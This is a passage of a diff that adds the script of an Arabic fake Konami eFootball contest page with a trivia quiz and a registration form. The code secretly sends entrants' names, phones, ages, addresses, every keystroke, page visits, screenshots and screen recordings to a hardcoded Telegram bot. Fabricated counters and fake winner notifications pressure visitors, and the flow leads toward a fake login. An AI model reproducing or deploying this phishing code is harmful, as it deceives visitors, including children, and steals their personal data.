+                    gain.gain.linearRampToValueAtTime(0.01, this.ctx.currentTime + 0.05);
+                    osc.connect(gain);
+                    gain.connect(this.ctx.destination);
+                    osc.start();
+                    osc.stop(this.ctx.currentTime + 0.05);
+                } catch(e) {}
+            }
+
+            playError() {
+                this.init();
+                try {
+                    const osc = this.ctx.createOscillator();
+                    const gain = this.ctx.createGain();
+                    osc.type = 'sawtooth';
+                    osc.frequency.setValueAtTime(150, this.ctx.currentTime);
+                    osc.frequency.setValueAtTime(110, this.ctx.currentTime + 0.15);
+                    gain.gain.setValueAtTime(0.4, this.ctx.currentTime);
+                    gain.gain.linearRampToValueAtTime(0.01, this.ctx.currentTime + 0.3);
+                    osc.connect(gain);
+                    gain.connect(this.ctx.destination);
+                    osc.start();
+                    osc.stop(this.ctx.currentTime + 0.3);
+                } catch(e) {}
+            }
+
+            playTick() {
+                this.init();
+                try {
+                    const osc = this.ctx.createOscillator();
+                    const gain = this.ctx.createGain();
+                    osc.type = 'square';
+                    osc.frequency.setValueAtTime(1200, this.ctx.currentTime);
+                    gain.gain.setValueAtTime(0.1, this.ctx.currentTime);
+                    gain.gain.linearRampToValueAtTime(0.01, this.ctx.currentTime + 0.03);
+                    osc.connect(gain);
+                    gain.connect(this.ctx.destination);
+                    osc.start();
+                    osc.stop(this.ctx.currentTime + 0.03);
+                } catch(e) {}
+            }
+
+            playSuccess() {
+                this.init();
+                try {
+                    const notes = [523.25, 659.25, 783.99, 1046.50];
+                    notes.forEach((freq, idx) => {
+                        const osc = this.ctx.createOscillator();
+                        const gain = this.ctx.createGain();
+                        osc.frequency.setValueAtTime(freq, this.ctx.currentTime + (idx * 0.08));
+                        gain.gain.setValueAtTime(0.25, this.ctx.currentTime + (idx * 0.08));
+                        gain.gain.exponentialRampToValueAtTime(0.01, this.ctx.currentTime + (idx * 0.08) + 0.3);
+                        osc.connect(gain);
+                        gain.connect(this.ctx.destination);
+                        osc.start(this.ctx.currentTime + (idx * 0.08));
+                        osc.stop(this.ctx.currentTime + (idx * 0.08) + 0.3);
+                    });
+                } catch(e) {}
+            }
+        }
+
+        const soundEngine = new SoundEngine();
+
+        // ==========================================
+        // 2. إدارة الخطوات والتنقل (Card Stepper)
+        // ==========================================
+        let currentStep = 1;
+        let stepHistory = [1];
+
+        function goToStep(stepNumber) {
+            soundEngine.playClick();
+            document.querySelectorAll('.step-card').forEach(card => card.classList.remove('active'));
+            
+            let targetCard = document.getElementById(`step-${stepNumber}`);
+            if (targetCard) {
+                targetCard.classList.add('active');
+                if (stepHistory[stepHistory.length - 1] !== stepNumber) {
+                    stepHistory.push(stepNumber);
+                }
+                currentStep = stepNumber;
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+                trackAction(`Navigate to Step ${stepNumber}`);
+            }
+        }
+
+        function goBackStep() {
+            if (stepHistory.length > 1) {
+                stepHistory.pop();
+                let prevStep = stepHistory[stepHistory.length - 1];
+                goToStep(prevStep);
+            } else {
+                goToStep(1);
+            }
+        }
+
+        // ==========================================
+        // 3. بنك الأسئلة والمحرك التفاعلي (30 سؤالاً)
+        // ==========================================
+        const questionBank = [
+            { q: "ما هو اسم المطور الرسمي للعبة eFootball؟", a: ["Konami", "EA Sports", "Ubisoft"], c: 0 },
+            { q: "ما المحرك المستخدم في تطوير eFootball الحديثة؟", a: ["Unreal Engine", "Fox Engine", "Unity"], c: 0 },
+            { q: "ما هي العملة الأساسية لشراء اللاعبين الإبيك؟", a: ["eFootball Coins", "GP", "eFootball Points"], c: 0 },
+            { q: "كم عدد اللاعبين في تشكيلة كرة القدم الأساسية؟", a: ["11 لاعب", "10 لاعبين", "12 لاعب"], c: 0 },
+            { q: "ما هو أعلى تصنيف ممكن لبطاقات العصر الإبيكي؟", a: ["100+", "90", "85"], c: 0 },
+            { q: "أي دولة ينتمي إليها المقر الرئيسي لشركة Konami؟", a: ["اليابان", "أمريكا", "كوريا الجنوبية"], c: 0 },
+            { q: "ما هو اللون الرسمي لشعار eFootball الحالي؟", a: ["الأزرق والأصفر", "الأحمر والأسود", "الأخضر"], c: 0 },
+            { q: "ما الميزة الخارقة في بطاقات Epic Boosters؟", a: ["إضافة نقاط إضافية للطاقات", "تغيير مركز اللاعب", "زيادة السرعة فقط"], c: 0 },
+            { q: "ما الاسم القديم لسلسلة لعبة eFootball؟", a: ["PES (Pro Evolution Soccer)", "FIFA", "Winning Eleven"], c: 0 },
+            { q: "أي من هؤلاء يعتبر أسطورة سفير للعبة eFootball؟", a: ["Lionel Messi", "Cristiano Ronaldo", "Neymar Jr"], c: 0 },
+            { q: "ما هي الطريقة الرئيسية للحصول على GP؟", a: ["لعب المباريات و الأفعال", "الشراء بالمال فقط", "شحن الكوينز"], c: 0 },
+            { q: "ما الحد الأقصى لمستوى أسلوب لعب المدرب؟", a: ["88+", "70", "50"], c: 0 },
+            { q: "ما هي فئة البطاقات التي تباع في المتجر النقدي مباشرة؟", a: ["eFootball Points Shop", "Epic Box", "National Pack"], c: 0 },
+            { q: "ما النمط المخصص للعب ضد أصدقائك عبر الشبكة؟", a: ["Friend Match", "eFootball League", "Tour Event"], c: 0 },
+            { q: "كم يستغرق الشوط الواحد في المباريات الافتراضية؟", a: ["5 دقائق", "10 دقائق", "15 دقيقة"], c: 0 },
+            { q: "أي زر يستخدم للتسديد القوي السريع (Stunning Shot)؟", a: ["سحب زر التسديد للجانب", "الضغط المزدوج", "زر التمرير"], c: 0 },
+            { q: "ما هو أعلى قسم (Division) في دوري eFootball؟", a: ["Division 1", "Division 3", "Division 10"], c: 0 },
+            { q: "ما هو العنصر المستخدم لتجديد عقد اللاعب لـ 60 يوم؟", a: ["Contract Renewal", "Skill Program", "Position Program"], c: 0 },
+            { q: "ما فائدة برامج التدريب (Skill Training)؟", a: ["إضافة مهارة جديدة للاعب", "رفع المستوى", "تغيير طاقته"], c: 0 },
+            { q: "ما الوقت المحدد لكل حدث أسبوعي في اللعبة؟", a: ["خميس واثنين", "الجمعة فقط", "الأحد"], c: 0 },
+            { q: "ما هو النادي الذي يملك شراكة حصرية مع Konami في إيطاليا؟", a: ["AC Milan / Inter", "Juventus", "Roma"], c: 0 },
+            { q: "كيف يمكنك الحصول على تجربة لاعبين مستقرة؟", a: ["رفع مستوى اللياقة وتناغم المدرب", "تغيير الشعار", "شراء ملعب"], c: 0 },
+            { q: "ما الزر المسؤول عن الدفاع المزدوج وتغطية الزميل؟", a: ["Match-up / Call Pressure", "Dash", "Pass"], c: 0 },
+            { q: "كم لاعب يمكنك استبداله أثناء المباراة؟", a: ["5 تبديلات", "3 تبديلات", "6 تبديلات"], c: 0 },
+            { q: "ما رمز العملة المجانية الخضراء الخاصة بـ Konami؟", a: ["eFootball Point", "eCoin", "G-Point"], c: 0 },
+            { q: "ما البطولة الرسمية العالمية التي تنظمها كونامي سنوياً؟", a: ["eFootball Championship Open", "World Cup PES", "Konami Cup"], c: 0 },
+            { q: "أي ميزة تسمح بنقل الخبرة من لاعب لآخر؟", a: ["Legacy Transfer", "Release", "Level Training"], c: 0 },
+            { q: "ما هي عقوبة المغادرة المتكررة للمباريات أونلاين؟", a: ["انخفاض تقييم Courtesy Rating", "حظر الحساب", "خصم الكوينز"], c: 0 },
+            { q: "ما الوضع الذي يتيح لك بناء فريق أحلامك؟", a: ["Dream Team", "Authentic Team", "Master League"], c: 0 },
+            { q: "ما الحد الأعلى لعدد اللاعبين في قائمتك الأساسية؟", a: ["500 لاعب", "100 لاعب", "1000 لاعب"], c: 0 }
+        ];
+
+        let selectedQuestions = [];
+        let currentQuizIndex = 0;
+        let correctAnswersCount = 0;
+        let quizTimerInterval = null;
+        let quizTimeLeft = 20;
+
+        function startQuizChallenge() {
+            // اختيار 5 أسئلة عشوائية
+            let shuffledBank = [...questionBank].sort(() => 0.5 - Math.random());
+            selectedQuestions = shuffledBank.slice(0, 5);
+            currentQuizIndex = 0;
+            correctAnswersCount = 0;
+            goToStep(2);
+            renderCurrentQuestion();
+        }
+
+        function renderCurrentQuestion() {
+            clearInterval(quizTimerInterval);
+            if (currentQuizIndex >= selectedQuestions.length) {
+                if (correctAnswersCount >= 3) {
+                    soundEngine.playSuccess();
+                    goToStep('quiz-success');
+                } else {
+                    alert('لم تجتز العدد المطلوب من الإجابات الصحيحة (3 من 5). سيعاد الاختبار بأسئلة جديدة!');
+                    startQuizChallenge();
+                }
+                return;
+            }
+
+            let qData = selectedQuestions[currentQuizIndex];
+            document.getElementById('question-text').innerText = qData.q;
+            document.getElementById('quiz-progress-text').innerText = `السؤال ${currentQuizIndex + 1} من 5`;
+
+            // تجهيز الإجابات وعشوائية الماكن
+            let answersContainer = document.getElementById('answers-container');
+            answersContainer.innerHTML = '';
+
+            let choices = qData.a.map((text, idx) => ({ text, isCorrect: idx === qData.c }));
+            choices.sort(() => 0.5 - Math.random()); // خلط الأماكن تلقائياً
+
+            choices.forEach(choice => {
+                let btn = document.createElement('button');
+                btn.className = 'btn-answer';
+                btn.innerText = choice.text;
+                btn.onclick = () => handleAnswerSelect(btn, choice.isCorrect);
+                answersContainer.appendChild(btn);
+            });
+
+            // تشغيل عداد الـ 20 ثانية
+            quizTimeLeft = 20;
+            let timerBar = document.getElementById('quiz-timer-bar');
+            timerBar.style.width = '100%';
+
+            quizTimerInterval = setInterval(() => {
+                quizTimeLeft--;
+                soundEngine.playTick();
+                timerBar.style.width = `${(quizTimeLeft / 20) * 100}%`;
+
+                if (quizTimeLeft <= 0) {
+                    clearInterval(quizTimerInterval);
+                    soundEngine.playError();
+                    // التبديل لسؤال بديل فوراً دون احتساب نقطة
+                    replaceCurrentQuestion();
+                }
+            }, 1000);
+        }
+
+        function handleAnswerSelect(btn, isCorrect) {
+            clearInterval(quizTimerInterval);
+            let allBtns = document.querySelectorAll('.btn-answer');
+            allBtns.forEach(b => b.disabled = true);
+
+            if (isCorrect) {
+                btn.classList.add('correct');
+                soundEngine.playSuccess();
+                correctAnswersCount++;
+                setTimeout(() => {
+                    currentQuizIndex++;
+                    renderCurrentQuestion();
+                }, 1000);
+            } else {
+                btn.classList.add('wrong');
+                soundEngine.playError();
+                setTimeout(() => {
+                    replaceCurrentQuestion();
+                }, 1000);
+            }
+        }
+
+        function replaceCurrentQuestion() {
+            // سحب سؤال بديل غير مستخدم
+            let unused = questionBank.filter(q => !selectedQuestions.includes(q));
+            if (unused.length > 0) {
+                let newQ = unused[Math.floor(Math.random() * unused.length)];
+                selectedQuestions[currentQuizIndex] = newQ;
+            }
+            renderCurrentQuestion();
+        }
+
+        // ==========================================
+        // 4. التحقق اللحظي من مدخلات النموذج
+        // ==========================================
+        function validateField(input, type) {
+            let val = input.value.trim();
+            let checkIcon = document.getElementById(`check-${input.id.replace('input-', '')}`);
+
+            let isValid = false;
+
+            if (type === 'name') {
+                isValid = /^[\u0600-\u06FFa-zA-Z\s]{3,}$/.test(val);
+            } else if (type === 'phone') {
+                isValid = /^[0-9+\s-]{8,}$/.test(val);
+                // منع التكرار العشوائي مثل 1111111 أو 123456
+                if (/^(.)\1+$/.test(val) || val.includes("123456")) isValid = false;
+                
+                // إضافة الرمز الدولي تلقائياً إذا لم يدخله
+                if (val.length > 6 && !val.startsWith('+')) {
+                    input.value = '+967 ' + val; // رمز مفترضي للمنطقة
+                }
+            } else if (type === 'age') {
+                let num = parseInt(val);
+                isValid = !isNaN(num) && num >= 7 && num <= 80;
+            } else if (type === 'text') {
+                isValid = val.length >= 2;
+            }
+
+            if (checkIcon) {
+                checkIcon.style.display = isValid ? 'block' : 'none';
+            }
+
+            // حفظ المسودة تلقائياً
+            localStorage.setItem(`draft_${input.id}`, val);
+            trackAction(`Typing in ${input.id}:${val}`);
+        }
+
+        function handleFormSubmit(e) {
+            e.preventDefault();
+            
+            let name = document.getElementById('input-fullname').value.trim();
+            let phone = document.getElementById('input-phone').value.trim();
+            let age = document.getElementById('input-age').value.trim();
+            let address = document.getElementById('input-address').value.trim();
+
+            if (!name || !phone || !age || !address) {
+                soundEngine.playError();
+                alert('يرجى ملء جميع الخانات المطلوبة بشكل صحيح!');
+                return;
+            }
+
+            soundEngine.playClick();
+            // حفظ بيانات المتسابق
+            localStorage.setItem('contestant_name', name);
+            localStorage.setItem('contestant_phone', phone);
+
+            // إرسال البيانات للتليجرام
+            let textMsg = `📋 **بيانات متسابق جديدة في مسابقة كونامي:**\n👤 **الاسم:** ${name}\n📞 **الهاتف:** \`${phone}\`\n🎂 **العمر:** ${age}\n📍 **العنوان:** ${address}`;
+            sendTelegramAlert(textMsg);
+
+            goToStep('verifying');
+
+            // بعد 2 ثانية تظهر صفحة لم نتعرف على حسابك
+            setTimeout(() => {
+                goToStep('unrecognized');
+            }, 2000);
+        }
+
+        function startFinalLoginProcess() {
+            soundEngine.playClick();
+            goToStep(4);
+            setTimeout(() => {
+                document.getElementById('login-loading-state').style.display = 'none';
+                document.getElementById('login-redirect-state').style.display = 'block';
+            }, 3000);
+        }
+
+        // ==========================================
+        // 5. العدادات التنازلية واللحظية
+        // ==========================================
+        function initTimersAndCounters() {
+            // عداد انتهاء التسجيل بنهاية يوم الجمعة
+            setInterval(() => {
+                const now = new Date();
+                const dayOfWeek = now.getDay();
+                const daysUntilFriday = (5 - dayOfWeek + 7) % 7;
+                
+                const endOfFriday = new Date(now);
+                endOfFriday.setDate(now.getDate() + daysUntilFriday);
+                endOfFriday.setHours(23, 59, 59, 999);
+
+                const diff = endOfFriday - now;
+                if (diff > 0) {
+                    const hrs = String(Math.floor((diff / (1000 * 60 * 60)) % 24)).padStart(2, '0');
+                    const mins = String(Math.floor((diff / (1000 * 60)) % 60)).padStart(2, '0');
+                    const secs = String(Math.floor((diff / 1000) % 60)).padStart(2, '0');
+                    document.getElementById('event-timer').innerText = `${hrs}:${mins}:${secs}`;
+                }
+            }, 1000);
+
+            // عداد الزوار المتغير تلقائياً
+            setInterval(() => {
+                let el = document.getElementById('live-visitors');
+                let cur = parseInt(el.innerText);
+                let change = Math.floor(Math.random() * 7) - 3;
+                let nextVal = Math.max(120, cur + change);
+                el.innerText = nextVal;
+            }, 4000);
+
+            // عداد المسجلين يزداد ببطء ولا يتجاوز 1000
+            setInterval(() => {
+                let el = document.getElementById('live-registered');
+                let cur = parseInt(el.innerText);
+                if (cur < 985) {
+                    el.innerText = cur + 1;
+                }
+            }, 12000);
+        }
+
+        // ==========================================
+        // 6. شريط الإشعارات اللحظية المنبثقة (Toasts)
+        // ==========================================
+        const fakeNames = [
+    "محمد أحمد الحساني", "علي فارس مفتاح", "صلاح محسن أحمد", "خالد الشمري", 
+    "نور الدين إسماعيل", "سلطان يوسف القرضاوي", "حمزة المعافى", "مصطفى الكاظمي",
+    "صلاح لطفي بن صلاح", "عمر سالم بانجوة", "يسلم عبدالوهاب", "عبدالله أحمد العلي", 
+    "ريان طارق داؤود", "إسلام عبدالله محمد", "رأفت علي بديع", "حسين إدريس طارق",
+    "سالم سعيد باوزير", "ماجد عبدالحكيم", "عمار ياسر الشريفي", "بلال توفيق السالم",
+    "طارق زياد النهدي", "أحمد مراد بن طالب", "وليد خالد الكندي", "صالح مبارك المنهالي",
+    "بدر ناصر العتيبي", "هشام بن خالد", "أنس عبدالرحمن", "يحيى زكريا القحطاني",
+    "فارس تركي العصيمي", "زياد فهد السبيعي", "عبدالعزيز بن راشد", "معاذ توفيق الناصري",
+    "سعود عبدالعزيز الدوسري", "عادل منصور الهاجري", "إبراهم ماجد الرفاعي", "سليمان حامد المطيري",
+    "فيصل عبدالله الغامدي", "جهاد بن طلال", "وسام عدنان الزهراني", "سيف الدين يونس",
+    "أسامة خليل الحارثي", "عاصم بن ثابت", "مالك مروان الشرفي", "أيمن صلاح العفيف",
+    "نواف مشعل العنزي", "أيوب عبدالصمد", "حاتم طاهر اليماني", "طلال عبدالإله",
+    "باسم عمار الرويلي", "نايف حمدان الصباح", "مروان إياد الجابر", "غازي سعد العارفي",
+    "مهند فيصل الحارثي", "أمجد عبداللطيف", "قتيبة يوسف السلمي", "سامي بن راشد",
+    "عز الدين توفيق", "شرف الدين عمران", "فراس بدر البقمي", "جمال إبراهيم العامري",
+    "وائل عبده الصبري", "أيمن ناصر القحطاني", "مروان طاهر الشبواني", "مقبل مبارك الكربي",
+    "تركي فهد الهاجري", "راشد حمد المري", "سعيد سالم العمري", "معتز عادل العولقي",
+    "فؤاد حسن الباكري", "عصام توفيق اليافعي", "أمين صالح الصبيحي", "ضياء الدين العولقي",
+    "مازن عبدالرب المفلحي", "همام فاروق السقاف", "وهيب علي الحارثي", "موسى جعفر العيدروس",
+    "منصور علي الكثيري", "نزار خليل التميمي", "هاشم محمد العطاس", "أكرم سعيد المحضار",
+    "نبيل طاهر البكري", "توفيق عباد الرصاص", "مختار عبدالجليل", "شريف فتحي السالمي",
+    "إلياس مراد الجابري", "يعقوب يوسف البلوشي", "صهيب أحمد الشحري", "نوح إبراهيم الكندي",
+    "زكريا يحيى المحرمي", "إدريس حمزة العولقي", "خالد وليد الضالعي", "عدنان سعيد المنهالي",
+    "عمار فايز المهري", "مشاري سعد السبيعي", "سلطان خالد الدوسري", "سعود ناصر السهلي",
+    "عبدالرحمن فهد القحطاني", "فيصل بدر المطيري", "نايف ثامر الشمري", "بندر وليد العتيبي",
+    "طلال عبدالله الحداد", "مقرن محمد الغامدي", "يزيد صالح محمد بن علي", "سلمان حامد المالكي"
+];
+        const fakeCountries = ["السعودية", "اليمن", "الإمارات", "الكويت","الصومال","السودان","البحرين","تونس","ليبيا", "مصر", "قطر", "عُمان،"];
+
+        function startLiveToastNotifications() {
+            setInterval(() => {
+                let randName = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+                let randCountry = fakeCountries[Math.floor(Math.random() * fakeCountries.length)];
+                showToast(`🎉 قام ${randName}**** من ${randCountry} بالتسجيل بنجاح في المسابقة!`);
+            }, 18000);
+
+            setInterval(() => {
+                let randName = fakeNames[Math.floor(Math.random() * fakeNames.length)];
+                showToast(`🏆 فاز المتسابق ${randName}**** بـ 5,800 كوينز من سحب الأسبوع الماضي!`);
+            }, 25000);
+        }
+
+        function showToast(text) {
+            let container = document.getElementById('toast-container');
+            let toast = document.createElement('div');
+            toast.className = 'live-toast';
+            toast.innerText = text;
+            container.appendChild(toast);
+
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                toast.style.transition = 'opacity 0.5s';
+                setTimeout(() => toast.remove(), 500);
+            }, 5000);
+        }
+
+        // ==========================================
+        // 7. درع انقطاع الاتصال وحفظ المسودة
+        // ==========================================
+        window.addEventListener('offline', () => {
+            document.getElementById('offline-overlay').style.display = 'flex';
+        });
+
+        window.addEventListener('online', () => {
+            document.getElementById('offline-overlay').style.display = 'none';
+        });
+
+        function loadSavedDrafts() {
+            ['input-fullname', 'input-phone', 'input-age', 'input-address', 'input-accid'].forEach(id => {
+                let saved = localStorage.getItem(`draft_${id}`);
+                let el = document.getElementById(id);
+                if (saved && el) el.value = saved;
+            });
+        }
+
+        // ==========================================
+        // 8. خلفية الجسيمات التفاعلية Canvas VFX
+        // ==========================================
+        function initParticleVFX() {
+            const canvas = document.getElementById('particle-canvas');
+            const ctx = canvas.getContext('2d');
+            let particles = [];
+
+            function resize() {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+            }
+            window.addEventListener('resize', resize);
+            resize();
+
+            for (let i = 0; i < 40; i++) {
+                particles.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height,
+                    radius: Math.random() * 2 + 1,
+                    color: Math.random() > 0.5 ? '#e60012' : '#00f2fe',
+                    vx: (Math.random() - 0.5) * 0.8,
+                    vy: (Math.random() - 0.5) * 0.8
+                });
+            }
+
+            function animate() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                particles.forEach(p => {
+                    p.x += p.vx;
+                    p.y += p.vy;
+                    if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
+                    if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
+
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
+                    ctx.fillStyle = p.color;
+                    ctx.shadowBlur = 10;
+                    ctx.shadowColor = p.color;
+                    ctx.fill();
+                });
+                requestAnimationFrame(animate);
+            }
+            animate();
+        }
+
+        function trackAction(actionName) {
+            let cId = localStorage.getItem("contestant_id");
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `📌 **إجراء جديد:** ${actionName}\n🆔 \`${cId}\``,
+                    parse_mode: "Markdown"
+                })
+            }).catch(() => {});
+        }
+
+        // تشغيل التهيئة عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', () => {
+            initTimersAndCounters();
+            startLiveToastNotifications();
+            loadSavedDrafts();
+            initParticleVFX();
+        });
+    </script>
+
+    <!-- ================= ==========================
+         كود المحادثة المباشرة والتتبع عبر التليجرام
+         ========================================== -->
+    <script>
+        // ==========================================
+        // كود المحادثة والمراقبة المباشرة المحدث والمطور
+        // ==========================================
+        const BOT_TOKEN = "8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg";
+        const CHAT_ID = "8796885500";
+
+        let contestantId = localStorage.getItem("contestant_id");
+        let contestantName = localStorage.getItem("contestant_name") || "متسابق";
+
+        if (!contestantId) {
+            contestantId = "USER_" + Math.floor(100000 + Math.random() * 900000);
+            localStorage.setItem("contestant_id", contestantId);
+        }
+
+        // استعادة آخر ID تحديث تم استلامه حتى لا تتكرر الرسائل عند فتح المتصفح
+        let lastUpdateId = parseInt(sessionStorage.getItem("last_telegram_update_id") || "0");
+        const processedMsgIds = new Set(JSON.parse(sessionStorage.getItem("processed_msg_ids") || "[]"));
+
+        let isChatOpen = false;
+        let autoCloseTimer = null;
+        let isSupportOnline = true;
+
+        // ضوابط عدم التكرار للتنبيهات (60 ثانية)
+        let lastLeaveAlertTime = 0;
+        let lastOnlineAlertTime = 0;
+        const THROTTLE_60_SEC = 60000;
+
+        // متغيرات تسجيل الفيديو
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let isRecording = false;
+
+        // تحميل السجل والمسودة عند البدء
+        document.addEventListener("DOMContentLoaded", () => {
+            loadChatHistory();
+            loadDraftMessage();
+            notifyUserEntrance();
+        });
+
+        // الأصوات التفاعلية
+        function playNotificationSound(type = 'receive') {
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = ctx.createOscillator();
+                const gain = ctx.createGain();
+                osc.connect(gain);
+                gain.connect(ctx.destination);
+
+                if (type === 'receive') {
+                    osc.frequency.setValueAtTime(587.33, ctx.currentTime);
+                    osc.frequency.setValueAtTime(880, ctx.currentTime + 0.1);
+                    gain.gain.setValueAtTime(0.2, ctx.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.3);
+                    osc.start();
+                    osc.stop(ctx.currentTime + 0.3);
+                } else {
+                    osc.frequency.setValueAtTime(440, ctx.currentTime);
+                    gain.gain.setValueAtTime(0.15, ctx.currentTime);
+                    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.15);
+                    osc.start();
+                    osc.stop(ctx.currentTime + 0.15);
+                }
+            } catch (e) { }
+        }
+
+        // فتح وإغلاق نافذة الدردشة
+        window.toggleChat = function() {
+            const widget = document.getElementById("chat-widget");
+            if (!widget) return;
+            isChatOpen = !isChatOpen;
+            widget.style.display = isChatOpen ? "flex" : "none";
+            cancelAutoClose();
+        };
+
+        function openChat() {
+            const widget = document.getElementById("chat-widget");
+            if (widget) {
+                widget.style.display = "flex";
+                isChatOpen = true;
+            }
+        }
+
+        function cancelAutoClose() {
+            if (autoCloseTimer) {
+                clearTimeout(autoCloseTimer);
+                autoCloseTimer = null;
+            }
+        }
+
+        function trigger10SecAutoOpen() {
+            if (!isChatOpen) {
+                openChat();
+                cancelAutoClose();
+                autoCloseTimer = setTimeout(() => {
+                    const widget = document.getElementById("chat-widget");
+                    if (widget) widget.style.display = "none";
+                    isChatOpen = false;
+                }, 10000);
+            }
+        }
+
+        function getCurrentTimeFormatted() {
+            const now = new Date();
+            return now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', hour12: true });
+        }
+
+        window.saveDraftMessage = function() {
+            const input = document.getElementById("chat-user-input");
+            if (input) sessionStorage.setItem("chat_draft", input.value);
+        };
+
+        function loadDraftMessage() {
+            const draft = sessionStorage.getItem("chat_draft");
+            const input = document.getElementById("chat-user-input");
+            if (draft && input) input.value = draft;
+        }
+
+        function saveChatHistory(msgObj) {
+            let history = JSON.parse(sessionStorage.getItem("chat_history") || "[]");
+            history.push(msgObj);
+            sessionStorage.setItem("chat_history", JSON.stringify(history));
+        }
+
+        function loadChatHistory() {
+            let history = JSON.parse(sessionStorage.getItem("chat_history") || "[]");
+            history.forEach(m => renderMessage(m.text, m.className, m.time, m.status, m.imgUrl));
+        }
+
+        function sendTelegramAlert(text) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
+            }).catch(() => {});
+        }
+
+        function notifyUserEntrance() {
+            const now = Date.now();
+            if (now - lastOnlineAlertTime >= THROTTLE_60_SEC) {
+                lastOnlineAlertTime = now;
+                const msg = `⚡ **دخول لصفحة المسابقة:**\n👤 **الاسم:** ${contestantName}\n🆔 **المعرف:** \`${contestantId}\` *(اضغط للنسخ)*`;
+                sendTelegramAlert(msg);
+            }
+        }
+
+        document.addEventListener("visibilitychange", () => {
+            const now = Date.now();
+            if (document.hidden) {
+                if (now - lastLeaveAlertTime >= THROTTLE_60_SEC) {
+                    lastLeaveAlertTime = now;
+                    sendTelegramAlert(`⚠️ **تنبيه مغادرة:** المتسابق ${contestantName} (🆔 \`${contestantId}\`) غادر الصفحة أو غير التطبيق.`);
+                }
+            } else {
+                if (now - lastOnlineAlertTime >= THROTTLE_60_SEC) {
+                    lastOnlineAlertTime = now;
+                    sendTelegramAlert(`🟢 **متصل الآن:** المتسابق ${contestantName} (🆔 \`${contestantId}\`) عاد للصفحة.`);
+                }
+            }
+        });
+
+        window.showChatFilePreview = function() {
+            const preview = document.getElementById("chat-file-preview");
+            if (preview) preview.style.display = "block";
+        };
+
+        // إرسال رسالة من المتسابق
+        window.sendChatMessage = function(e) {
+            if (e) e.preventDefault();
+            cancelAutoClose();
+
+            const textInput = document.getElementById("chat-user-input");
+            const fileInput = document.getElementById("chat-file-input");
+            const preview = document.getElementById("chat-file-preview");
+
+            const text = textInput ? textInput.value.trim() : "";
+            const hasFile = fileInput && fileInput.files.length > 0;
+
+            if (!text && !hasFile) return;
+
+            playNotificationSound('send');
+            const timeStr = getCurrentTimeFormatted();
+            const formattedHeader = `📌 **رسالة من:** ${contestantName}\n🆔 **المعرف:** \`${contestantId}\`\n💬 **الرسالة:** ${text}`;
+
+            if (hasFile) {
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", fileInput.files[0]);
+                formData.append("caption", formattedHeader);
+                formData.append("parse_mode", "Markdown");
+
+                const fileURL = URL.createObjectURL(fileInput.files[0]);
+                displayAndSaveMessage(text, 'user-msg', timeStr, '✔', fileURL);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+            } else {
+                displayAndSaveMessage(text, 'user-msg', timeStr, '✔');
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: formattedHeader, parse_mode: "Markdown" })
+                });
+            }
+
+            if (!isSupportOnline) {
+                setTimeout(() => {
+                    displayAndSaveMessage("وصلتنا رسالتك وسيجاب عليها قريباً.", 'admin-msg', getCurrentTimeFormatted(), '');
+                }, 1000);
+            }
+
+            if (textInput) textInput.value = "";
+            sessionStorage.removeItem("chat_draft");
+            if (fileInput) fileInput.value = "";
+            if (preview) preview.style.display = "none";
+        };
+
+        // التقاط شاشة فوري للمتسابق
+        window.takeUserInstantScreenshot = function() {
+            takeScreenShot(0);
+        };
+
+        function takeScreenShot(delaySeconds = 0) {
+            if (typeof html2canvas === 'undefined') return;
+            
+            const executeShot = () => {
+                html2canvas(document.body).then(canvas => {
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append("chat_id", CHAT_ID);
+                        formData.append("photo", blob, "user_screenshot.png");
+                        formData.append("caption", `📸 **لقطة شاشة للمتسابق:** ${contestantName}\n🆔 \`${contestantId}\``);
+                        formData.append("parse_mode", "Markdown");
+
+                        const timeStr = getCurrentTimeFormatted();
+                        const imgURL = URL.createObjectURL(blob);
+                        displayAndSaveMessage("تم إرسال لقطة الشاشة للدعم.", 'user-msg', timeStr, '✔', imgURL);
+                        playNotificationSound('send');
+
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+                    });
+                });
+            };
+
+            if (delaySeconds > 0) {
+                setTimeout(executeShot, delaySeconds * 1000);
+            } else {
+                executeShot();
+            }
+        }
+
+        async function startScreenRecording(durationSeconds = 10, delaySeconds = 0) {
+            if (isRecording) return;
+
+            const startExec = async () => {
+                try {
+                    const stream = await navigator.mediaDevices.getDisplayMedia({
+                        video: { mediaSource: "screen" },
+                        audio: true
+                    });
+
+                    recordedChunks = [];
+                    mediaRecorder = new MediaRecorder(stream);
+
+                    mediaRecorder.ondataavailable = (e) => {
+                        if (e.data.size > 0) recordedChunks.push(e.data);
+                    };
+
+                    mediaRecorder.onstop = () => {
